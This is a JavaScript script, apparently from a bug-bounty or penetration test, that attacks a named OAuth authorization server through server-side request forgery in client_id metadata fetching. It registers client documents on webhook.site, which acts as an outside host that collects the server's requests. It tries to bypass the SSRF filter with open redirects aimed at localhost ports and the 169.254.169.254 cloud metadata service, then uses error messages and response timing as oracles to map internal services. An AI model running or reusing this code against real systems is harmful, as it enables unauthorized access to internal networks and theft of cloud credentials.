const AS = "https://bugsecure-api.senintel.sn";
const UUID = "3ef992c0-b173-407f-ab55-e3ea613a534a";
const BASE = "https://webhook.site/" + UUID;
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const F = async (url, opt = {}) => { for (let a = 0; a < 3; a++) { try { return await fetch(url, { ...opt, signal: AbortSignal.timeout(25000) }); } catch (e) { await sleep(2000); } } return null; };
const TS = Date.now();

async function publish(doc) {
  await F("https://webhook.site/token/" + UUID, { method: "PUT", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ default_content: typeof doc === "string" ? doc : JSON.stringify(doc), default_content_type: "application/json" }) });
  await sleep(500);
}
async function authorize(clientId, label) {
  const u = new URL(AS + "/oauth/authorize");
  u.searchParams.set("response_type", "code");
  u.searchParams.set("client_id", clientId);
  u.searchParams.set("redirect_uri", BASE + "/cb");
  u.searchParams.set("scope", "programs:read");
  u.searchParams.set("state", "bb-" + Math.random().toString(36).slice(2));
  u.searchParams.set("code_challenge", "E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM");
  u.searchParams.set("code_challenge_method", "S256");
  u.searchParams.set("resource", "https://bugsecure-api.senintel.sn");
  const t0 = Date.now();
  const r = await F(u, { redirect: "manual" });
  const dt = r ? Date.now() - t0 : -1;
  const loc = r?.headers.get("location") || "";
  const err = (loc.match(/[?&]code=([^&]+)/) || [])[1] || (loc.includes("consent") ? "CONSENT" : "?");
  const desc = (loc.match(/error_description=([^&]+)/) || [])[1] || "";
  console.log("  " + label.padEnd(48) + String(dt + "ms").padStart(7) + "  " + err + (desc ? "  | " + decodeURIComponent(desc).slice(0, 70) : ""));
  await sleep(3600);
  return { dt, err, desc, loc };
}
async function logHits(label) {
  const r = await F("https://webhook.site/token/" + UUID + "/requests?sorting=newest");
  const j = await r.json();
  const hits = (j.data || []).filter((q) => q.url.includes(UUID));
  console.log("  [" + label + "] " + hits.length + " requete(s) sur le webhook :");
  for (const q of hits.slice(0, 5)) console.log("      " + q.method + " " + q.url.slice(0, 110) + " | UA: " + ((q.headers?.["user-agent"] || [])[0] || "?"));
  await sleep(800);
  return hits;
}

console.log("=== 1) L AS SUIT-IL LES REDIRECTIONS ? (contournement du filtre SSRF) ===");
const HOP = "/hop-" + TS;
const redir = "https://httpbingo.org/redirect-to?url=" + encodeURIComponent(BASE + HOP) + "&x=" + TS;
await publish({ client_id: BASE + HOP, client_name: "hop-test", redirect_uris: [BASE + "/cb"], grant_types: ["authorization_code"], response_types: ["code"], token_endpoint_auth_method: "none" });
const r1 = await authorize(redir, "client_id = redirecteur (httpbingo) -> webhook");
const hits = await logHits("apres authorize via redirecteur");
const hopHit = hits.find((h) => h.url.includes(HOP));
console.log("  => l AS a suivi la redirection ? " + (hopHit ? "OUI (2e saut vers " + HOP + ")" : "NON"));
if (hopHit) {
  console.log("  => le FETCH FINAL (notre document valide) a ete lu : " + r1.err);
  console.log("\n  === REDIRECTION VERS UNE CIBLE INTERNE (le filtre est-il contourne ?) ===");
  const internal = "https://httpbingo.org/redirect-to?url=" + encodeURIComponent("http://127.0.0.1:3000/") + "&y=" + TS;
  await authorize(internal, "redirecteur -> 127.0.0.1:3000");
  const meta = "https://httpbingo.org/redirect-to?url=" + encodeURIComponent("http://169.254.169.254/latest/meta-data/") + "&z=" + TS;
  await authorize(meta, "redirecteur -> 169.254.169.254 (IMDS)");
}

console.log("\n=== 2) ORACLE DE CONTENU : la description d erreur distingue-t-elle les contenus ? ===");
const TAX = [
  ["texte non JSON", "PLAIN-" + TS],
  ["JSON vide", "{}"],
  ["JSON sans client_id", JSON.stringify({ client_name: "x", redirect_uris: [BASE + "/cb"] })],
  ["JSON client_id different", JSON.stringify({ client_id: "https://webhook.site/autre", client_name: "x", redirect_uris: [BASE + "/cb"] })],
  ["JSON sans redirect_uris", JSON.stringify({ client_id: BASE + "/t" + TS, client_name: "x" })],
  ["JSON valide", JSON.stringify({ client_id: BASE + "/t" + TS, client_name: "x", redirect_uris: [BASE + "/cb"], grant_types: ["authorization_code"], response_types: ["code"], token_endpoint_auth_method: "none" })],
];
for (const [n, doc] of TAX) {
  const p = BASE + "/t" + TS + "-" + Math.random().toString(36).slice(2, 6);
  await publish(doc.replace(/"https:\/\/webhook\.site\/t\d+"/, JSON.stringify(p)));
  const r = await authorize(p, n);
  if (r.err === "CONSENT") console.log("      -> le document distant a ete ACCEPTE (le contenu distant definit le client)");
}

console.log("\n=== 3) PORTEE INTERNE : minimum de N echantillons (le min retire le bruit) ===");
const CANDS = [
  ["temoin externe (webhook)", BASE + "/p" + TS],
  ["127.0.0.1:3000 (app web)", "http://127.0.0.1:3000/?p=" + TS],
  ["127.0.0.1:9200 (ES?)", "http://127.0.0.1:9200/?p=" + TS],
  ["127.0.0.1:11211 (memcached?)", "http://127.0.0.1:11211/?p=" + TS],
  ["127.0.0.1:80", "http://127.0.0.1/?p=" + TS],
  ["192.0.2.1 (non routable, temoin)", "http://192.0.2.1/?p=" + TS],
  ["10.0.0.1 (prive, temoin)", "http://10.0.0.1/?p=" + TS],
  ["169.254.169.254 (IMDS)", "http://169.254.169.254/?p=" + TS],
];
for (const [n, url] of CANDS) {
  const ts = [];
  for (let i = 0; i < 5; i++) {
    const r = await authorize(url + "&i=" + i, n + " [" + (i + 1) + "]");
    if (r.dt > 0) ts.push(r.dt);
  }
  ts.sort((a, b) => a - b);
  const min = ts[0], med = ts[Math.floor(ts.length / 2)];
  console.log("   " + n.padEnd(36) + "min=" + String(min + "ms").padStart(7) + " median=" + String(med + "ms").padStart(7) + "  [" + ts.join(",") + "]");
}
